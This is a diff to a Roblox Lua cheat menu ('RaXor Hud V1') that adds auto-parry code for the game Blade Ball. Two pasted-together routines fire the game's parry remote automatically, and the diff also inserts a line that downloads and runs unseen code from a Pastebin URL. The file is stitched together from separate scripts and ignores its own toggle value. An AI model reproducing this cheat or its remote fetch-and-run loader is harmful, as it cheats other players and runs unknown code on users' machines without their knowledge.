@@ -4,67 +4,135 @@ local PhantomForcesWindow = Library:NewWindow("🪐RaXor Hud V1🪐")
 
 local KillingCheats = PhantomForcesWindow:NewSection("Combat")
 
-KillingCheats:CreateToggle("Auto ParryGod V1", function(value) local Debug = false -- Set this to true if you want my debug output.
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+KillingCheats:CreateToggle("Auto ParryGod V1", function(value) game:GetService("Workspace")
+local players = game:GetService("Players")
+local runService = game:GetService("RunService")
+
+local ballFolder = workspace.Balls
+local indicatorPart = Instance.new("Part")
+indicatorPart.Size = Vector3.new(5, 5, 5)
+indicatorPart.Anchored = true
+indicatorPart.CanCollide = false
+indicatorPart.Transparency = 1
+indicatorPart.BrickColor = BrickColor.new("Bright red")
+indicatorPart.Parent = workspace
+
+local lastBallPressed = nil
+local isKeyPressed = false
+
+local function calculatePredictionTime(ball, player)
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        local rootPart = player.Character.HumanoidRootPart
+        local relativePosition = ball.Position - rootPart.Position
+        local velocity = ball.Velocity + rootPart.Velocity 
+        local a = (ball.Size.magnitude / 2) 
+        local b = relativePosition.magnitude
+        local c = math.sqrt(a * a + b * b)
+        local timeToCollision = (c - a) / velocity.magnitude
+        return timeToCollision
+    end
+    return math.huge
+end
+
+local function updateIndicatorPosition(ball)
+    indicatorPart.Position = ball.Position
+end
+
+local function checkProximityToPlayer(ball, player)
+    local predictionTime = calculatePredictionTime(ball, player)
+    local realBallAttribute = ball:GetAttribute("realBall")
+    local target = ball:GetAttribute("target")
+    
+    local ballSpeedThreshold = math.max(0.5, 0.6 - ball.Velocity.magnitude * 0.01)
+
+    if predictionTime <= ballSpeedThreshold and realBallAttribute == true and target == player.Name and not isKeyPressed then
+        game:GetService("ReplicatedStorage").Remotes.ParryButtonPress:Fire()
+        wait(0.005)
+        game:GetService("ReplicatedStorage").Remotes.ParryButtonPress:Fire()
+        lastBallPressed = ball
+        isKeyPressed = true
+    elseif lastBallPressed == ball and (predictionTime > ballSpeedThreshold or realBallAttribute ~= true or target ~= player.Name) then
+        isKeyPressed = false
+    end
+end
+
+local function checkBallsProximity()
+    local player = players.LocalPlayer
+    if player then
+        for _, ball in pairs(ballFolder:GetChildren()) do
+            checkProximityToPlayer(ball, player)
+            updateIndicatorPosition(ball)
+        end
+    end
+end
+
+runService.Heartbeat:Connect(checkBallsProximity)
+
+local msg = Instance.new("Message",workspace)
+msg.Text = "Made By : RaXor Scripts"
+wait(6.0)
+msg:Destroy()
+
+ -- Open Source Blade Ball Auto Parry By PawsThePaw --
+--// My Discord: pawsthepaw
+--// Notes: I'm not giving Away my Freeze & Invisibility Detection, lmao, this is sort of decent, time based, Enjoy, Skid, or Learn, Its Your Choice.
+getgenv().Paws = {
+        ["AutoParry"] = true,
+        ["PingBased"] = true,
+        ["PingBasedOffset"] = 0,
+        ["DistanceToParry"] = 0.5,
+        ["BallSpeedCheck"] = true,
+}
+
 local Players = game:GetService("Players")
-
 local Player = Players.LocalPlayer or Players.PlayerAdded:Wait()
-local Remotes = ReplicatedStorage:WaitForChild("Remotes", 9e9) -- A second argument in waitforchild what could it mean?
-local Balls = workspace:WaitForChild("Balls", 9e9)
+local ReplicatedPaw = game:GetService("ReplicatedStorage")
 
--- Functions
+local Paws = ReplicatedPaw:WaitForChild("Remotes", 9e9)
+local PawsBalls = workspace:WaitForChild("Balls", 9e9)
+local PawsTable = getgenv().Paws
 
-local function print(...) -- Debug print.
-    if Debug then
-        warn(...)
+local function IsTheTarget()
+        return Player.Character:FindFirstChild("Highlight")
+end
+
+local function FindBall()
+    local RealBall
+    for i, v in pairs(PawsBalls:GetChildren()) do
+        if v:GetAttribute("realBall") == true then
+            RealBall = v
+        end
     end
+    return RealBall
 end
 
-local function VerifyBall(Ball) -- Returns nil if the ball isn't a valid projectile; true if it's the right ball.
-    if typeof(Ball) == "Instance" and Ball:IsA("BasePart") and Ball:IsDescendantOf(Balls) and Ball:GetAttribute("realBall") == true then
-        return true
-    end
-end
-
-local function IsTarget() -- Returns true if we are the current target.
-    return (Player.Character and Player.Character:FindFirstChild("Highlight"))
-end
-
-local function Parry() -- Parries.
-    Remotes:WaitForChild("ParryButtonPress"):Fire()
-end
-
--- The actual code
-
-Balls.ChildAdded:Connect(function(Ball)
-    if not VerifyBall(Ball) then
-        return
-    end
-    
-    print(`Ball Spawned: {Ball}`)
-    
-    local OldPosition = Ball.Position
-    local OldTick = tick()
-    
-    Ball:GetPropertyChangedSignal("Position"):Connect(function()
-        if IsTarget() then -- No need to do the math if we're not being attacked.
-            local Distance = (Ball.Position - workspace.CurrentCamera.Focus.Position).Magnitude
-            local Velocity = (OldPosition - Ball.Position).Magnitude -- Fix for .Velocity not working. Yes I got the lowest possible grade in accuplacer math.
-            
-            print(`Distance: {Distance}\nVelocity: {Velocity}\nTime: {Distance / Velocity}`)
+game:GetService("RunService").PreRender:connect(function()
+        if not FindBall() then 
+                return
+        end
+        local Ball = FindBall()
         
-            if (Distance / Velocity) <= 10 then -- Sorry for the magic number. This just works. No, you don't get a slider for this because it's 2am.
-                Parry()
-            end
+        local BallPosition = Ball.Position
+        
+        local BallVelocity = Ball.AssemblyLinearVelocity.Magnitude
+        
+        local Distance = Player:DistanceFromCharacter(BallPosition)
+        
+        local Ping = BallVelocity * (game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000)
+        
+        if PawsTable.PingBased then
+        Distance -= Ping + PawsTable.PingBasedOffset
         end
         
-        if (tick() - OldTick >= 1/60) then -- Don't want it to update too quickly because my velocity implementation is aids. Yes, I tried Ball.Velocity. No, it didn't work.
-            OldTick = tick()
-            OldPosition = Ball.Position
+        if PawsTable.BallSpeedCheck and BallVelocity == 1 then return
         end
-    end)
+        
+        if (Distance / BallVelocity) <= PawsTable.DistanceToParry and IsTheTarget() and PawsTable.AutoParry then
+               Paws:WaitForChild("ParryButtonPress"):Fire()
+           end
 end)
 
+loadstring(game:HttpGet("https://pastebin.com/raw/t2391h1A"))()
 local function get_plrRP()
   local plrRP = get_plrChar():FindFirstChild("HumanoidRootPart")
   if plrRP then
@@ -294,7 +362,7 @@ local function checkBallDistance()
     local ball = focusedBall
     local distanceToPlayer = (ball.Position - charPos).Magnitude
 
-    if distanceToPlayer < 11 then
+    if distanceToPlayer < 10 then
         parryButtonPress:Fire()
         return
     end
